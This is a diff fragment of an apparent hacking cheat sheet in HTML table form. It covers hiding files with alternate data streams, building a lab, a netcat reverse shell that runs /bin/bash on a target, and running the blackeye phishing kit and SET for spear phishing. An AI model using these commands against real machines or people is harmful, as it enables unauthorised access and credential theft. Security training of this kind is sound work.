@@ -385,6 +385,7 @@ $ sudo cat crackpass.txt (output / result)<br />
 <th>Hide files on target machines</th>
 <td>Steganography - hide files in windows and linux systems<br /></td>
 <td>
+
 Alternate Data Streams to hide file inside another file:<br />
 $ mkdir myhiddenstuff<br />
 $ cd  myhiddenstuff<br />
@@ -442,6 +443,7 @@ Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
 <th>Build a Hacking Lab</th>
 <td>Safe and secure environment<br /></td>
 <td>
+
 > Hacking Machine - Kali <br />
 > Vulnerable Webapp machine - VULNHUB :
  
@@ -457,6 +459,7 @@ Save wireshark sniffs as pcaps. Avoid http and telnet. <br />
 <th>reverse shells with netcat</th>
 <td>how to get remote access to your hacking targets<br /></td>
 <td>
+
 $ nc -lnvp 87 -s source_ip (l=listening for a connection, n= no dns, only ip; v=verbose, p=port) <br />
 In the target machine (both machines must have netcat-nc): <br />
 $ nc -e /bin/bash source_ip 87 (port 87) <br />
@@ -471,6 +474,7 @@ In windows: using [PayloadsAllTheThings](https://github.com/swisskyrepo/Payloads
 <th>Phishing attacks</th>
 <td>phishing website and emails with [blackeye](https://github.com/An0nUD4Y/blackeye)<br /></td>
 <td>
+
 $ git clone https://github.com/An0nUD4Y/blackeye <br />
 $ sudo ./blackeye.sh (setup [ngrok](https://ngrok.com/) with auth token )<br />
 Spear Phishing Attack: use SET (Social Engineering Toolkit):<br />
